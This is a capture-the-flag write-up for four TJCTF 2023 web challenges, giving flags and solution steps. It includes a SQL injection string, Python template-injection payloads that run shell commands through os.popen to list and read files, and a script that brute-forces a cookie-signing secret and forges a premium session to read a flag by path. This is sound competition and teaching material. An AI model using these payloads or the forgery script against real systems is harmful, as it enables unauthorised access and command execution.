# Web challenges in TJCTF 2023
- [hi](#hi)
- [swill-squill](#swill-squill)
- [outdated](#outdated)
- [pay-to-win](#pay-to-win)

-----

## hi

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/d1bf92ee-d474-4bb6-9a0b-0dedf8b4c38a)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/11d70c38-edd4-4676-a276-f70ee50410e6)

Nothing interesting in the website. But there is something interesting in the source.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/af75691d-0cc6-4bd9-940f-230fc6c765c6)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/f3791466-1a0f-45f7-bb95-952bd7e394f3)

Flag: `tjctf{pretty_canvas_577f7045}`

-----

## swill-squill

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/f96c4654-7412-44fe-952a-8712b2f4cbf0)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/358fe78e-55b0-4984-b23d-3b1a9d6cee25)

This is vulnerable to basic `' or 1=1 ; --` SQL injection.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/cb9c8d95-9877-40ce-9926-c8e87003b62b)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/93c86016-9219-4c20-bd7f-7281803c06c9)

Flag: `tjctf{swill_sql_1y1029345029374}`

-----

## outdated

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/fdfb692b-6471-4e58-8042-54f3e0e4a3f4)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/8c71c4bb-540a-47dd-9634-a5cae54556b2)

Some blacklisted items here but its essentially a SSTI sort of. I tried a basic payload.

`print(''.__class__.__mro__[1].__subclasses__())`

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/eb00a81f-7428-4cff-8683-3b7c88001e63)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/da577c04-8ffc-4092-8475-3b53734cf0d2)

4th last item is my [favourite](https://blog.p6.is/Python-SSTI-exploitable-classes/#Using-os-wrap-close){:target="_blank" rel="noopener"}.

`print(''.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__['sys'].modules['os'].popen('ls').read())`

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/04537d2d-ec8a-4aae-910a-e967aadefb56)

`print(''.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__['sys'].modules['os'].popen('cat flag-cce1c56d-466d-4af9-8ae7-c7bcf99d5c49.txt').read())`

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/0590a762-f28d-4ba3-9789-b6cb9f8219db)

Flag: `tjctf{oops_bad_filter_3b582f74}`

-----

## pay-to-win

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/13e85289-50bc-453b-a680-b6840b097627)

Need to bypass this so need to bruteforce the 6 character key.

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/0f5b034a-b483-47d4-aebb-2a332bbbba0b)

Getting premium allows us to load anything. Like the flag

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/eca7551c-58cf-4dec-908c-9f22d5c519c0)

![image](https://github.com/jeromepalayoor/ctf-archive-hub/assets/63996033/493c079d-4191-4fad-b75a-76fe380942da)

```py
import requests
import hashlib
import itertools

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
length = 6
combinations = itertools.product(characters, repeat=length)

url = 'https://pay-to-win.tjc.tf/'

new = "eyJ1c2VybmFtZSI6ICJqZXJvbWUiLCAidXNlcl90eXBlIjogInByZW1pdW0ifQ==" #'{"username": "jerome", "user_type": "premium"}'
old = "eyJ1c2VybmFtZSI6ICJqZXJvbWUiLCAidXNlcl90eXBlIjogImJhc2ljIn0=" #'{"username": "jerome", "user_type": "basic"}'
h = "46378b50e362bb73a60886b2d55957b6a79acd1ae8d6069a7bce2fbbda3f640c"


def hash(data):
    return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()

actual_secret = ""
actual_hash = ""

for c in combinations:
    secret = ''.join(c)
    hashed = hash(old + secret)

    if hashed == h:
        actual_secret = secret
        actual_hash = hash(new + secret)
        break

print(actual_secret)
print(actual_hash)

r = requests.get(url + "?theme=/secret-flag-dir/flag.txt", cookies={'data': new, 'hash': actual_hash})

print(r.text)
```

Flag: `tjctf{not_random_enough_64831eff}`
